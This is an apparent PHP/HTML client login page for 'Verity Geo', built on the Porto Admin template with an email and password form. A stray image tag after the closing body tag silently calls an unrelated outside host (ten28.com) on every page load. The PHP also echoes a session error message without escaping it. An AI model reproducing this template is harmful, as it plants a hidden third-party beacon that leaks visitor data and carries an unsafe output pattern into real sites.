<!doctype html>
<html class="fixed">
	<head>

		<!-- Basic -->
		<meta charset="UTF-8">

		<meta name="keywords" content="HTML5 Admin Template" />
		<meta name="description" content="Porto Admin - Responsive HTML5 Template">
		<meta name="author" content="okler.net">

		<!-- Mobile Metas -->
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

		<!-- Web Fonts  -->
		<link href="http://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800|Shadows+Into+Light" rel="stylesheet" type="text/css">

		<!-- Vendor CSS -->
		<link rel="stylesheet" href="dashboard/assets3/vendor/bootstrap/css/bootstrap.css" />
		<link rel="stylesheet" href="dashboard/assets3/vendor/font-awesome/css/font-awesome.css" />
		<link rel="stylesheet" href="dashboard/assets3/vendor/magnific-popup/magnific-popup.css" />
		<link rel="stylesheet" href="dashboard/assets3/vendor/bootstrap-datepicker/css/datepicker3.css" />

		<!-- Theme CSS -->
		<link rel="stylesheet" href="dashboard/assets3/stylesheets/theme.css" />

		<!-- Skin CSS -->
		<link rel="stylesheet" href="dashboard/assets3/stylesheets/skins/default.css" />

		<!-- Theme Custom CSS -->
		<link rel="stylesheet" href="dashboard/assets3/stylesheets/theme-custom.css">

		<!-- Head Libs -->
		<script src="dashboard/assets3/vendor/modernizr/modernizr.js"></script>

	</head>
	<body>
		<!-- start: page -->
		<section class="body-sign">
			<div class="center-sign">
				<a href="/" class="logo pull-left text-success">
					Verity Geo CLIENT LOGIN
				</a>

				<div class="panel panel-sign">
					<div class="panel-title-sign mt-xl text-right">
						<h2 class="title text-uppercase text-bold m-none" style="background:green;"><i class="fa fa-user mr-xs"></i> Sign In</h2>
					</div>
					
                  
                       
					<div class="panel-body" style="border-top-color:green;">
					      <?php session_start(); if (isset($_SESSION['error']))  { ?>
    					    <div class="alert alert-dismissable alert-danger">
                                <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
                                <p class="text-center"><strong>Sorry!</strong> <?php echo $_SESSION['error']; unset($_SESSION['error']); ?></p>
                             </div>
                          <?php }  ?>
						<form action="loginproc" method="post">
							<div class="form-group mb-lg">
								<label>Username</label>
								<div class="input-group input-group-icon">
									<input name="email" type="email" class="form-control input-lg" />
									<span class="input-group-addon">
										<span class="icon icon-lg">
											<i class="fa fa-user"></i>
										</span>
									</span>
								</div>
							</div>

							<div class="form-group mb-lg">
								<div class="clearfix">
									<label class="pull-left">Password</label>
								</div>
								<div class="input-group input-group-icon">
									<input name="pass_word" type="password" class="form-control input-lg" />
									<span class="input-group-addon">
										<span class="icon icon-lg">
											<i class="fa fa-lock"></i>
										</span>
									</span>
								</div>
							</div>

							<div class="row">
								<div class="col-sm-offset-4 text-right">
									<button type="submit" class="btn btn-success hidden-xs">Sign In</button>
									<button type="submit" class="btn btn-success btn-block btn-lg visible-xs mt-lg">Sign In</button>
								</div>
							</div>

						</form>
					</div>
				</div>

				<p class="text-center text-muted mt-md mb-md">&copy; Copyright 2018. All rights reserved. Verity Geo.</p>
			</div>
		</section>
		<!-- end: page -->

		<!-- Vendor -->
		<script src="dashboard/assets3/vendor/jquery/jquery.js"></script>
		<script src="dashboard/assets3/vendor/jquery-browser-mobile/jquery.browser.mobile.js"></script>
		<script src="dashboard/assets3/vendor/bootstrap/js/bootstrap.js"></script>
		<script src="dashboard/assets3/vendor/nanoscroller/nanoscroller.js"></script>
		<script src="dashboard/assets3/vendor/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>
		<script src="dashboard/assets3/vendor/magnific-popup/magnific-popup.js"></script>
		<script src="dashboard/assets3/vendor/jquery-placeholder/jquery.placeholder.js"></script>
		
		<!-- Theme Base, Components and Settings -->
		<script src="assets3/javascripts/theme.js"></script>
		
		<!-- Theme Custom -->
		<script src="assets3/javascripts/theme.custom.js"></script>
		
		<!-- Theme Initialization Files -->
		<script src="assets3/javascripts/theme.init.js"></script>

	</body><img src="http://www.ten28.com/fref.jpg">
</html>